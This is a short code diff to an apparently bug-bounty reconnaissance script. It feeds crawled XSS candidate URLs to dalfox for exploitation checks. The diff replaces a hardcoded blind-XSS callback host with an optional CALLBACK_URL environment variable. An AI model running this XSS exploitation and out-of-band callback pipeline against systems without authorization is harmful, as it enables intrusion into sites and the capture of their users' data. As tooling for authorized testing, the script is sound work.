@@ -1,3 +1,4 @@
+import os
 import re
 import subprocess
 import sys
@@ -175,9 +176,13 @@ if has_results(crawKatana):
     if has_results(xssgf):
         ok(f"XSS candidates → {xssgf} ({count_lines(xssgf)})")
         step("XSS exploitation check via dalfox")
+        # Blind-XSS callback: set CALLBACK_URL to your own OOB host
+        # (interactsh/XSS Hunter/Collaborator). Unset -> no -b flag.
+        _cb = os.environ.get("CALLBACK_URL", "").strip()
+        _blind = f"-b '{_cb}' " if _cb else ""
         skip_or_run(dalfoxfile, lambda: pipe(
             f"cat '{xssgf}' | dalfox pipe --skip-bav --mining-dom --deep-domxss "
-            f"--ignore-return -b 'https://ofjaaaaah.xss.ht/' --follow-redirects "
+            f"--ignore-return {_blind}--follow-redirects "
             f"--silence | anew '{dalfoxfile}'"
         ))
         ok(f"Dalfox results → {dalfoxfile} ({count_lines(dalfoxfile)})") if has_results(dalfoxfile) else ok("No XSS confirmed by dalfox")
